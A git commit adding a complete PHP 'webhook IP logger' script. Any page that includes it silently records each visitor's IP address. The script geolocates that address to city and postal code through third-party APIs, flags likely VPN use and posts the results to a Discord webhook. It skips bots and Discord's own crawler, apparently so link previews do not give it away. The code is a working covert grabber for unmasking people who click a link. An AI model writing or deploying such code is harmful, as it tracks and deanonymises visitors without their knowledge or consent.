4a5e299d5f77edcb129b2fb967699078d6238091
NightcoreDev <56366540+NightcoreDev@users.noreply.github.com>
2019-10-22 11:40:35 +0100

    Create index.php

---
+++ index.php
@@ -0,0 +1,45 @@
+/* 
+Please keep this copyright statemnet in tact
+Original Creator Of This Webhook IP Logger: ᴮᵉᵗᵗᵉʳ ᴼᶠᶠ ᴳᵒⁿᵉ#0869
+Creation Date: 21/10/19 
+APIs Provided By: Octolus (geoiplookup.io) and IP-API (ip-api.com)
+
+
+NOTE: You can use this in every page if you make a it a external page and require it in every other page that is php.
+
+*/ 
+
+<?php
+
+        $webhookurl = "discord webhook link";
+
+        $ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
+        $browser = $_SERVER['HTTP_USER_AGENT'];
+        if(preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
+            exit();
+        }
+        $TheirDate = date('d/m/Y');
+        $TheirTime = date('G:i:s');
+        $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
+        $vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
+        if($vpnCon->connection_type==="Corporate"){
+            $vpn = "Yes (Double Check: $details->isp)";
+        }else{
+            $vpn = "No (Double Check: $details->isp)";
+        }
+        $flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
+        $data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**IsVPN?** $vpn  (Possible False-Postives)";
+
+        $json_data = array ('content'=>"$data", 'username'=>"Newgen Visited From: $details->country", 'avatar_url'=> "$flag");
+        $make_json = json_encode($json_data);
+        $ch = curl_init( $webhookurl );
+
+        curl_setopt( $ch, CURLOPT_POST, 1);
+        curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
+        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt( $ch, CURLOPT_HEADER, 0);
+        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
+
+        $response = curl_exec( $ch );
+
+?>
